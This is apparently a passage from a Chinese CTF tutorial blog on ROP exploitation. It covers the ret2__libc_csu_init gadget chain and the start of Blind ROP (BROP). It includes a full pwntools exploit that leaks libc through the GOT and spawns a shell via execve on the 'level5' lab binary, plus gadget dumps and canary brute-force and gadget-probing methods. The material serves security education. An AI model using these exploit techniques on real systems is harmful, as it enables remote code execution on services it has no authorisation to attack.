class=\"line\">.text:00000000004005C0                 push    r15</span><br><span class=\"line\">.text:00000000004005C2                 push    r14</span><br><span class=\"line\">.text:00000000004005C4                 mov     r15d, edi</span><br><span class=\"line\">.text:00000000004005C7                 push    r13</span><br><span class=\"line\">.text:00000000004005C9                 push    r12</span><br><span class=\"line\">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class=\"line\">.text:00000000004005D2                 push    rbp</span><br><span class=\"line\">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">.text:00000000004005DA                 push    rbx</span><br><span class=\"line\">.text:00000000004005DB                 mov     r14, rsi</span><br><span class=\"line\">.text:00000000004005DE                 mov     r13, rdx</span><br><span class=\"line\">.text:00000000004005E1                 sub     rbp, r12</span><br><span class=\"line\">.text:00000000004005E4                 sub     rsp, 8</span><br><span class=\"line\">.text:00000000004005E8                 sar     rbp, 3</span><br><span class=\"line\">.text:00000000004005EC                 call    _init_proc</span><br><span class=\"line\">.text:00000000004005F1                 test    rbp, rbp</span><br><span class=\"line\">.text:00000000004005F4                 jz      short loc_400616</span><br><span class=\"line\">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class=\"line\">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class=\"line\">.text:0000000000400600</span><br><span class=\"line\">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j</span><br><span class=\"line\">.text:0000000000400600                 mov     rdx, r13</span><br><span class=\"line\">.text:0000000000400603                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400606                 mov     edi, r15d</span><br><span class=\"line\">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class=\"line\">.text:000000000040060D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class=\"line\">.text:0000000000400614                 jnz     short loc_400600</span><br><span class=\"line\">.text:0000000000400616</span><br><span class=\"line\">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j</span><br><span class=\"line\">.text:0000000000400616                 add     rsp, 8</span><br><span class=\"line\">.text:000000000040061A                 pop     rbx</span><br><span class=\"line\">.text:000000000040061B                 pop     rbp</span><br><span class=\"line\">.text:000000000040061C                 pop     r12</span><br><span class=\"line\">.text:000000000040061E                 pop     r13</span><br><span class=\"line\">.text:0000000000400620                 pop     r14</span><br><span class=\"line\">.text:0000000000400622                 pop     r15</span><br><span class=\"line\">.text:0000000000400624                 retn</span><br><span class=\"line\">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>\n\n<p>这里我们可以利用以下几点</p>\n<ul>\n<li>从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。</li>\n<li>从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，<strong>但其实此时rdi的高32位寄存器值为0（自行调试）</strong>，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。</li>\n<li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li>\n</ul>\n<p>蒸米的一步一步学ROP之linux_x64篇中level5为例</p>\n<p>1.首先检查程序的安全保护</p>\n<p>➜ ret2__libc_csu_init git:(iromise) ✗ checksec level5<br>   Arch:   amd64-64-little<br>   RELRO:  Partial RELRO<br>   Stack:  No canary found<br>   NX:    NX enabled<br>   PIE:   No PIE (0x400000)</p>\n<p>程序为64位，开启了堆栈不可执行保护。</p>\n<p>2.其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">ssize_t</span> <span class=\"title\">vulnerable_function</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [sp+0h] [bp-80h]@1</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>简单浏览下程序，发现程序中既没有system函数地址，也没有/bin/sh字符串，所以两者都需要我们自己去构造了。</p>\n<p><strong>注：这里我尝试在我本机使用system函数来获取shell失败了，应该是环境变量的问题，所以这里使用的是execve来获取shell。</strong></p>\n<p>3.基本利用思路如下：</p>\n<ul>\n<li>利用栈溢出执行libc_csu_gadgets获取write函数地址，并使得程序重新执行main函数</li>\n<li>根据libcsearcher获取对应libc版本以及execve函数地址</li>\n<li>再次利用栈溢出执行libc_csu_gadgets向bss段写入execve地址以及’/bin/sh’地址，并使得程序重新执行main函数。</li>\n<li>再次利用栈溢出执行libc_csu_gadgets执行execve(‘/bin/sh’)获取shell。</li>\n</ul>\n<p>exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">##context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">level5 = ELF(<span class=\"string\">&#x27;./level5&#x27;</span>)</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./level5&#x27;</span>)</span><br><span class=\"line\">write_got = level5.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_got = level5.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">main_addr = level5.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">bss_base = level5.bss()</span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x0000000000400600</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x000000000040061A</span></span><br><span class=\"line\">fakeebp = <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0,</span></span><br><span class=\"line\">    <span class=\"comment\"># rbp should be 1,enable not to jump</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 should be the function we want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rdi=edi=r15d</span></span><br><span class=\"line\">    <span class=\"comment\"># rsi=r14</span></span><br><span class=\"line\">    <span class=\"comment\"># rdx=r13</span></span><br><span class=\"line\">    payload = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x80</span> + fakeebp</span><br><span class=\"line\">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class=\"line\">        r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payload += p64(csu_front_addr)</span><br><span class=\"line\">    payload += <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x38</span></span><br><span class=\"line\">    payload += p64(last)</span><br><span class=\"line\">    sh.send(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class=\"line\"><span class=\"comment\">## write(1,write_got,8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, write_got, <span class=\"number\">8</span>, write_got, <span class=\"number\">1</span>, main_addr)</span><br><span class=\"line\">write_addr = u64(sh.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libc_base = write_addr - libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">execve_addr = libc_base + libc.dump(<span class=\"string\">&#x27;execve&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;execve_addr &#x27;</span> + <span class=\"built_in\">hex</span>(execve_addr))</span><br><span class=\"line\"><span class=\"comment\">##gdb.attach(sh)</span></span><br><span class=\"line\"><span class=\"comment\">## read(0,bss_base,16)</span></span><br><span class=\"line\"><span class=\"comment\">## read execve_addr and /bin/sh\\x00</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, read_got, <span class=\"number\">16</span>, bss_base, <span class=\"number\">0</span>, main_addr)</span><br><span class=\"line\">sh.send(p64(execve_addr) + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## execve(bss_base+8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, bss_base, <span class=\"number\">0</span>, <span class=\"number\">0</span>, bss_base + <span class=\"number\">8</span>, main_addr)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>改进</strong></p>\n<p>在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>\n<p><strong>改进1-提前控制rbx与rbp</strong></p>\n<p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数，那么我们就可以减少16字节，即我们所需的字节数只需要112。</p>\n<p><strong>改进2-多次利用</strong></p>\n<p>其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件</p>\n<ul>\n<li>漏洞可以被多次触发</li>\n<li>在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。</li>\n</ul>\n<p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p>\n<p><strong>gadget</strong></p>\n<p>其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_init</span><br><span class=\"line\">_start</span><br><span class=\"line\">call_gmon_start</span><br><span class=\"line\">deregister_tm_clones</span><br><span class=\"line\">register_tm_clones</span><br><span class=\"line\">__do_global_dtors_aux</span><br><span class=\"line\">frame_dummy</span><br><span class=\"line\">__libc_csu_init</span><br><span class=\"line\">__libc_csu_fini</span><br><span class=\"line\">_fini</span><br></pre></td></tr></table></figure>\n\n<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>\n<p>需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器</p>\n<ul>\n<li>利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。</li>\n<li>利用中间部分的代码控制了rdx，rsi，edi。</li>\n</ul>\n<p>而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/5i 0x000000000040061A</span><br><span class=\"line\">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class=\"line\">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class=\"line\">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class=\"line\">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061b</span><br><span class=\"line\">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class=\"line\">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class=\"line\">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061A+3</span><br><span class=\"line\">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class=\"line\">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061e</span><br><span class=\"line\">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061f</span><br><span class=\"line\">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">gef➤  x/5i 0x0000000000400620</span><br><span class=\"line\">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class=\"line\">gef➤  x/5i 0x0000000000400621</span><br><span class=\"line\">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class=\"line\">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">gef➤  x/5i 0x000000000040061A+9</span><br><span class=\"line\">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class=\"line\">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class=\"line\">   0x400625:    nop</span><br><span class=\"line\">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class=\"line\">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>\n\n<p><strong>参考题目</strong></p>\n<ul>\n<li>2016 XDCTF pwn100</li>\n<li>2016 华山杯 SU_PWN</li>\n</ul>\n<p><strong>BROP</strong></p>\n<p>BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是<strong>Hacking Blind</strong></p>\n<p>BROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流.</p>\n<ol>\n<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>\n<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx,     MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。</li>\n</ol>\n<p>目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。</p>\n<p><strong>基本思路</strong></p>\n<p>在BROP中，基本的遵循的思路如下</p>\n<ul>\n<li><p>判断栈溢出长度</p>\n</li>\n<li><ul>\n<li>暴力枚举</li>\n</ul>\n</li>\n<li><p>Stack Reading</p>\n</li>\n<li><ul>\n<li>获取栈上的数据来泄露canaries，以及ebp和返回地址。</li>\n</ul>\n</li>\n<li><p>Bind ROP</p>\n</li>\n<li><ul>\n<li>找到足够多的 gadgets      来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。</li>\n</ul>\n</li>\n<li><p>Build the exploit</p>\n</li>\n<li><ul>\n<li>利用输出函数来 dump      出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit</li>\n</ul>\n</li>\n</ul>\n<p><strong>栈溢出长度</strong></p>\n<p>直接从1暴力枚举即可，直到发现程序崩溃。</p>\n<p><strong>Stack Reading</strong></p>\n<p>如下所示，这是目前经典的栈布局</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">buffer|canary|saved fame pointer|saved returned address</span><br></pre></td></tr></table></figure>\n\n<p>要向得到canary以及之后的变量，我们需要解决第一个问题，如何得到overflow的长度，这个可以通过不断尝试来获取。</p>\n<p>其次，关于canary以及后面的变量，所采用的的方法一致，这里我们以canary为例。</p>\n<p>canary本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。</p>\n<p>需要注意的是，攻击条件2表明了程序本身并不会因为crash有变化，所以每次的canary等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有256种可能，所以在32位的情况下，我们最多需要爆破1024次，64位最多爆破2048次。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162057713.png\" alt=\"image-20210629162057713\" style=\"zoom:67%;\" />\n\n<p><strong>Blind ROP</strong></p>\n<p>最朴素的执行write函数的方法就是构造系统调用。</p>\n<p>pop rdi; ret # socket<br> pop rsi; ret # buffer<br> pop rdx; ret # length<br> pop rax; ret # write syscall number<br> syscall</p>\n<p>但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。</p>\n<p><strong>BROP gadgets</strong></p>\n<p>首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162209719.png\" alt=\"image-20210629162209719\" style=\"zoom:67%;\" />\n\n<p><strong>find a call write</strong></p>\n<p>我们可以通过plt表来获取write的地址。</p>\n<p><strong>control rdx</strong></p>\n<p>需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序</p>\n<p>pop rdx; ret</p>\n<p>这样的指令几乎没有。那么，我们该如何控制rdx的数值呢？这里需要说明执行strcmp的时候，rdx会被设置为将要被比较的字符串的长度，所以我们可以找到strcmp函数，从而来控制rdx。</p>\n<p>那么接下来的问题，我们就可以分为两项</p>\n<ul>\n<li><p>寻找gadgets</p>\n</li>\n<li><p>寻找PLT表</p>\n</li>\n<li><ul>\n<li>write入口</li>\n<li>strcmp入口</li>\n</ul>\n</li>\n</ul>\n<p><strong>寻找gadgets</strong></p>\n<p>首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况</p>\n<ul>\n<li>程序直接崩溃</li>\n<li>程序运行一段时间后崩溃</li>\n<li>程序一直运行而并不崩溃</li>\n</ul>\n<p>为了寻找合理的gadgets，我们可以分为以下两步</p>\n<p><strong>寻找stop gadgets</strong></p>\n<p>所谓stop gadget一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。</p>\n<p>其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。</p>\n<p>之所以要寻找stop gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。例子如下图</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162456711.png\" alt=\"image-20210629162456711\" style=\"zoom:67%;\" />\n\n<p>但是，如果我们布置了stop gadget，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。</p>\n<p><strong>识别 gadgets</strong></p>\n<p>那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址</p>\n<ul>\n<li><p><strong>Probe</strong></p>\n</li>\n<li><ul>\n<li>探针，也就是我们想要探测的代码地址。一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护，再不济，就可能是程序是32位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。</li>\n</ul>\n</li>\n<li><p><strong>Stop</strong></p>\n</li>\n<li><ul>\n<li>不会使得程序崩溃的stop      gadget的地址。</li>\n</ul>\n</li>\n<li><p><strong>Trap</strong></p>\n</li>\n<li><ul>\n<li>可以导致程序崩溃的地址</li>\n</ul>\n</li>\n</ul>\n<p>我们可以通过在栈上摆放不同顺序的<strong>Stop</strong>与 <strong>Trap</strong>从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子</p>\n<ul>\n<li><p>probe,stop,traps(traps,traps,…)</p>\n</li>\n<li><ul>\n<li><p>我们通过程序崩溃与否(<strong>如果程序在probe处直接崩溃怎么判断</strong>)可以找到不会对栈进行pop操作的gadget，如</p>\n</li>\n<li><ul>\n<li>ret</li>\n<li>xor eax,eax; ret</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>probe,trap,stop,traps</p>\n</li>\n<li><ul>\n<li><p>我们可以通过这样的布局找到只是弹出一个栈变量的gadget。如</p>\n</li>\n<li><ul>\n<li>pop rax; ret</li>\n<li>pop rdi; ret</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>probe, trap, trap,     trap, trap, trap, trap, stop, traps</p>\n</li>\n<li><ul>\n<li><p>我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop      gadget相似的gadget。<strong>这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，</strong>这里一般来说会遇到两处比较有意思的地方</p>\n</li>\n<li><ul>\n<li>plt处不会崩，，</li>\n<li>_start处不会崩，相当于程序重新执行。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。</p>\n<p>但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。</p>\n<p>但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop gadgets。此外，这个gadgets通过错位还可以生成pop rsp等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。</p>\n<p>此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。</p>\n<p>需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.</p>\n<p><strong>寻找PLT</strong></p>\n<p>如下图所示，程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162829637.png\" alt=\"image-20210629162829637\" style=\"zoom:67%;\" />\n\n<p>此外，对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。除此之外，我们还可以通过前后偏移6字节，来判断我们是处于plt表项中间还是说处于开头。</p>\n<p><strong>控制rdx</strong></p>\n<p>当我们找到plt表之后，下面，我们就该想办法来控制rdx的数值了，那么该如何确认strcmp的位置呢？需要提前说的是，并不是所有的程序都会调用strcmp函数，所以在没有调用strcmp函数的情况下，我们就得利用其它方式来控制rdx的值了。这里给出程序中使用strcmp函数的情况。</p>\n<p>之前，我们已经找到了brop的gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址</p>\n<ul>\n<li>readable，可读的地址。</li>\n<li>bad,     